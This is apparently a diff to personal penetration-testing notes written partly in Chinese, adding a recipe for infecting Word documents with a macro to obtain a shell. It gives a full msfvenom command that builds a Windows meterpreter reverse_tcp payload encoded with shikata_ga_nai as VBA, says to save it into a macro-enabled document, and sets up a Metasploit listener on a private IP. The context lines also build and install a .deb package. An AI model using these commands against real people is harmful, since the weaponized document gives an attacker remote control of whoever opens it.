@@ -75,3 +75,18 @@ dpkg-deb --build free xfree.deb
 
 dpkg -i xfree.deb
 
+	@利用宏感染word文档获取shell@
+	
+sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe >1.txt
+
+MACRO CODE  宏代码
+payload  内容  -> 保存到启用宏的文档
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp 
+options
+set lhost 192.168.100.143
+exploit   
+
+
+	
